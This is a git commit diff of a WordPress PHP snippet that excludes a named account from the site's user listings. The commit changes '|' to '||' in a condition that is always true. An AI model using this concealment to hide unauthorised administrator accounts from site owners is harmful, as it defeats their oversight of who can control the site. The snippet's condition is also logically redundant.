80d7a916362260959c9d5cb690075d35cd17ba58
Shahadat Shuvo <shuvombm02@gmail.com>
2018-10-17 16:31:12 +0600

    Update hide-wp-user-from-function.php

--- hide-wp-user-from-function.php
+++ hide-wp-user-from-function.php
@@ -6,7 +6,7 @@ function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
 
-  if ($username != 'username' | $username == 'username') { 
+  if ($username != 'username' || $username == 'username') { 
     global $wpdb;
     $user_search->query_where = str_replace('WHERE 1=1',
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'username'",$user_search->query_where);
